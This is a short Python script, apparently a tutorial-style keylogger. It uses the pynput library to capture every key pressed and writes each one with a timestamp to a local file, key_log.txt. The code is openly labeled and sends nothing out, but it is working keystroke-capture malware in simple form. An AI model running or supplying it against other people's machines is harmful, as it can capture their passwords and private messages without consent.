from pynput import keyboard
import logging

logz = ""

#set up a logging file which is named key_log.txt records all messages recorded by on_press function
logging.basicConfig(filename=(logz + 'key_log.txt'), format='%(asctime)s: %(message)s', level=logging.DEBUG)

#records keystroke on press and logs it
def on_press(key):
    logging.info(str(key))

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
